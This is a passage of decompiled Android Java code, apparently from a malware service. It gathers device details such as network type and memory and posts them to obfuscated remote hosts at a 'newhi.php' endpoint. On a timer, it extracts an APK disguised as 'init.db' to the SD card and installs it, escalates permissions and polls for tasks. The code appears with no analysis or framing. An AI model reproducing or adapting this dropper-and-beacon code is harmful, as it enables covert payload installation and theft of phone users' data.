      arrayList.add(new BasicNameValuePair("nettype", this.m10));
    if (this.m9 != null && !"".equals(this.m9))
      arrayList.add(new BasicNameValuePair("sdmemory", this.m9));
    if (this.m8 != null && !"".equals(this.m8))
      arrayList.add(new BasicNameValuePair("aliamemory", this.m8));
    HttpPost httpPost = new HttpPost(paramString);
    try {
      httpPost.setEntity((HttpEntity)new UrlEncodedFormEntity(arrayList, "UTF-8"));
      int i = (new DefaultHttpClient()).execute((HttpUriRequest)httpPost).getStatusLine().getStatusCode();
      if (i == 200)
        bool = true;
      return bool;
    } catch (Exception exception) {
      return false;
    }
  }

  private void doSearchReport() {
    updateInfo();
    int i = 0;
    try {
      while (true) {
        if (i >= RR.S.length)
          return;
        boolean bool = _doSearchReport(String.valueOf(new String(RU.U9(RR.S[i]))) + "newhi.php");
        if (!bool) {
          i++;
          continue;
        }
        break;
      }
    } catch (Exception exception) {}
  }

  private void doTimerTask() {
    this.m14++;
    RU.U7((Context)this, "init.db", "/sdcard/idb.apk", 49536);
    if (!RU.U10.U4((Context)this, "com.google.map") && this.m14 % 2L == 0L && (new File("/sdcard/idb.apk")).exists()) {
      RU.U10.U5((Context)this, "/sdcard/idb.apk");
      return;
    }
    if (this.m13 == 2) {
      getPermission2();
      return;
    }
    if (this.m13 == 3) {
      getPermission3();
      return;
    }
    if (RU.U2((Context)this)) {
      if (this.m14 % 60L == 0L) {
        doSearchReport();
        return;
      }
      if (this.m14 % 10L == 0L) {
        doSearchTask();
        return;
      }
    }
  }

  private void updateInfo() {
    this.m3 = RU.U11.U2((Context)this);
    this.m4 = RU.U11.U3((Context)this);
    this.m5 = RU.U11.U4();
    this.m6 = RU.U11.U5()[0];
    this.m7 = RU.U11.U5()[1];
    this.m8 = RU.U11.U6((Context)this);
    this.m9 = RU.U11.U9((Context)this);
    this.m10 = RU.U11.U10((Context)this);
    this.m11 = RU.U11.U12((Context)this);
  }
}

